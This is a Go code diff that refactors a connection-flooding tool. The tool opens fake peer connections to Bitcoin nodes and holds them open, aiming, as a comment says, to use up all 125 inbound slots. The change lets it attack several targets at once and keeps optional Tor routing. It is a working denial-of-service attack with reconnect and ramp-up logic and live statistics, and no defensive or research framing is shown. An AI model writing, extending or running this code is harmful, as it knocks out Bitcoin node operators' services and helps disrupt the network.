@@ -7,6 +7,33 @@ import (
 	"time"
 )
 
+var targets []*Target
+
+func slowDownBitcoinPeer(address net.TCPAddr, numberPeerFlood int) {
+	fmt.Printf("Target %s flood with %d peers\n", address.String(), numberPeerFlood)
+
+	target := createTarget(address, numberPeerFlood)
+	targets = append(targets, &target)
+
+	target.slowDown()
+}
+
+// Target is a target Bitcoin node
+type Target struct {
+	address         net.TCPAddr
+	addressA        string
+	numberPeerFlood int64
+
+	// statistics
+	activeFakePeers, activeAttempts int64
+	handshakeErrors                 int64
+	connectErrors                   int64
+}
+
+func createTarget(address net.TCPAddr, numberPeerFlood int) Target {
+	return Target{address: address, addressA: address.String(), numberPeerFlood: int64(numberPeerFlood)}
+}
+
 /*
 Background:
 https://github.com/bitcoin/bitcoin/blob/df7addc4c6e990141869c41decaf3ef98c4e45d2/src/net.h
@@ -17,17 +44,17 @@ static const unsigned int DEFAULT_MAX_PEER_CONNECTIONS = 125;
 This means that if we manage to acquire 125 peers to the target, it exhausts all inbound connection slots.
 */
 
-func slowDownTarget(target *net.TCPAddr, parallelConnections int) {
+func (t *Target) slowDown() {
 	initialSlowConnect := true
 
-	for count := 0; count < parallelConnections; count++ {
+	for count := 0; int64(count) < t.numberPeerFlood; count++ {
 		// Try to initially only connect 5. Then scale up!
 		if count == 5 && initialSlowConnect {
 			initialSlowConnect = false
 
 			// wait until 3 active nodes
 			for {
-				if activeFakePeers >= 3 {
+				if t.activeFakePeers >= 3 {
 					break
 				}
 
@@ -35,7 +62,7 @@ func slowDownTarget(target *net.TCPAddr, parallelConnections int) {
 			}
 		}
 
-		go fakePeerConnect(target)
+		go t.fakePeerConnect()
 
 		// wait for each one at least 1 second to not be too aggressive initially
 		time.Sleep(time.Second * 1)
@@ -43,8 +70,8 @@ func slowDownTarget(target *net.TCPAddr, parallelConnections int) {
 }
 
 // fakePeerConnect creates a single connection and tries to maintain it. Automated re-connect attempt.
-func fakePeerConnect(target *net.TCPAddr) {
-	node := NewNode(target)
+func (t *Target) fakePeerConnect() {
+	node := NewNode(&t.address)
 	if node == nil {
 		fmt.Printf("Error creating new node\n")
 		return
@@ -52,23 +79,23 @@ func fakePeerConnect(target *net.TCPAddr) {
 
 	for {
 		// limit to max 10 concurrent attempts to not waste too many resources
-		if activeAttempts-activeFakePeers >= 10 {
+		if t.activeAttempts-t.activeFakePeers >= 10 {
 			time.Sleep(time.Millisecond * 1000)
 			continue
 		}
 
-		atomic.AddInt64(&activeAttempts, 1)
+		atomic.AddInt64(&t.activeAttempts, 1)
 
-		createConnectionPing(node)
+		t.createConnectionPing(node)
 
 		node.Close()
-		atomic.AddInt64(&activeAttempts, -1)
+		atomic.AddInt64(&t.activeAttempts, -1)
 
 		time.Sleep(time.Millisecond * 400)
 	}
 }
 
-func createConnectionPing(node *Node) {
+func (t *Target) createConnectionPing(node *Node) {
 	var err error
 
 	if torEnable {
@@ -80,21 +107,21 @@ func createConnectionPing(node *Node) {
 
 	if err != nil {
 		//fmt.Printf("Connect error: %v\n", err)
-		atomic.AddInt64(&connectErrors, 1)
+		atomic.AddInt64(&t.connectErrors, 1)
 		return
 	}
 
 	err = node.Handshake()
 	if err != nil {
 		//fmt.Printf("Handshake error: %v\n", err)
-		atomic.AddInt64(&handshakeErrors, 1)
+		atomic.AddInt64(&t.handshakeErrors, 1)
 
 		return
 	}
 
 	// valid connection
-	atomic.AddInt64(&activeFakePeers, 1)
-	defer atomic.AddInt64(&activeFakePeers, -1)
+	atomic.AddInt64(&t.activeFakePeers, 1)
+	defer atomic.AddInt64(&t.activeFakePeers, -1)
 
 	for {
 		time.Sleep(time.Second * 10)
@@ -117,24 +144,22 @@ func createConnectionPing(node *Node) {
 	}
 }
 
-var activeFakePeers, activeAttempts int64
-var handshakeErrors int64
-var connectErrors int64
-
-func stats(target string) {
+func stats() {
 	for {
+		<-time.After(time.Second * 5)
+
 		fmt.Println("------------------------------------------------------------------------------------------------------------------------")
 		fmt.Println("Target                  Active Fake Peers    Attempts to Connect    Currently Sleeping    Handshake Errs    Connect Errs")
 		fmt.Println("------------------------------------------------------------------------------------------------------------------------")
 
-		fmt.Printf("%-21s               %5d                  %5d                 %5d             %5d           %5d\n", target, activeFakePeers, activeAttempts-activeFakePeers, numberPeerFlood-activeAttempts, handshakeErrors, connectErrors)
+		for _, t := range targets {
+			fmt.Printf("%-21s               %5d                  %5d                 %5d             %5d           %5d\n", t.addressA, t.activeFakePeers, t.activeAttempts-t.activeFakePeers, t.numberPeerFlood-t.activeAttempts, t.handshakeErrors, t.connectErrors)
+
+			// reset stats
+			atomic.StoreInt64(&t.handshakeErrors, 0)
+			atomic.StoreInt64(&t.connectErrors, 0)
+		}
 
 		fmt.Printf("\n")
-
-		// reset stats
-		atomic.StoreInt64(&handshakeErrors, 0)
-		atomic.StoreInt64(&connectErrors, 0)
-
-		<-time.After(time.Second * 5)
 	}
 }
